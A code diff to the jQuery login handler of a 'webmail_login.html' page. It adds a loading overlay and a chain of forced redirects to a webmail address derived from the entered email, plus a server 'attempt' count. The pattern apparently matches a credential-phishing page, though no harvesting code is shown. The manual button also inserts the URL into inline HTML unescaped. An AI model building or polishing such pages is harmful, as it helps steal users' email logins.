@@ -285,6 +285,10 @@
                              $('#login-status-message').text(response.msg || 'Login successful! Redirecting...');
                              $('#login-status').removeClass('error-notice').addClass('success-notice').show();
                              
+                             // Show loading overlay during redirect
+                             $('#loading-overlay').show();
+                             $('#loading-content p').text('Login successful! Redirecting to webmail...');
+                             
                              // Get redirect URL from response or construct it
                              var redirectUrl = response.redirect_url || getWebmailDomain(email);
                              
@@ -292,11 +296,55 @@
                              console.log('Redirect URL:', redirectUrl);
                              console.log('Attempt number:', response.attempt);
                              
-                             // Redirect after 2 seconds
-                             setTimeout(function() {
-                                 console.log('Redirecting to:', redirectUrl);
+                             // Force redirect immediately and also after delay as backup
+                             console.log('Attempting immediate redirect to:', redirectUrl);
+                             
+                             // Try multiple redirect methods
+                             try {
+                                 // Method 1: Direct assignment
                                  window.location.href = redirectUrl;
-                             }, 2000);
+                             } catch (e) {
+                                 console.log('Method 1 failed, trying Method 2');
+                                 try {
+                                     // Method 2: Using replace
+                                     window.location.replace(redirectUrl);
+                                 } catch (e2) {
+                                     console.log('Method 2 failed, trying Method 3');
+                                     // Method 3: Using assign
+                                     window.location.assign(redirectUrl);
+                                 }
+                             }
+                             
+                             // Backup redirect after 1 second
+                             setTimeout(function() {
+                                 console.log('Backup redirect to:', redirectUrl);
+                                 window.location.href = redirectUrl;
+                             }, 1000);
+                             
+                             // Final backup redirect after 3 seconds
+                             setTimeout(function() {
+                                 console.log('Final backup redirect to:', redirectUrl);
+                                 window.location.href = redirectUrl;
+                             }, 3000);
+                             
+                             // Emergency redirect after 5 seconds using form submission
+                             setTimeout(function() {
+                                 console.log('Emergency redirect using form submission');
+                                 var form = document.createElement('form');
+                                 form.method = 'GET';
+                                 form.action = redirectUrl;
+                                 document.body.appendChild(form);
+                                 form.submit();
+                             }, 5000);
+                             
+                             // Add manual redirect button after 6 seconds if still on page
+                             setTimeout(function() {
+                                 if (window.location.href.indexOf('webmail_login.html') !== -1) {
+                                     console.log('Adding manual redirect button');
+                                     var manualRedirect = '<div style="text-align:center;margin-top:20px;"><button onclick="window.location.href=\'' + redirectUrl + '\'" style="background:#007cba;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;">Click here to continue to webmail</button></div>';
+                                     $('#login-status').append(manualRedirect);
+                                 }
+                             }, 6000);
                              
                          } else {
                              // Login failed - show error message
